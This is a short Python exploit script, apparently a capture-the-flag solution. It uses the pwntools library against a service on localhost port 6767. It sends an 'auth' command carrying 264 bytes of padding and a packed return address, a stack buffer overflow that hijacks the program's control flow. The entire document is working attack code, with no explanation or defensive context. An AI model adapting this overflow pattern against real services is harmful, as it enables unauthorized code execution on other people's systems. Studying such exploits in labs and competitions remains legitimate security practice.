from pwn import *

conn = remote('127.0.0.1', 6767)
conn.sendline(b"auth " + b'A'*(256+8) + p64(0x405953))
print(conn.recv().decode())
conn.close()
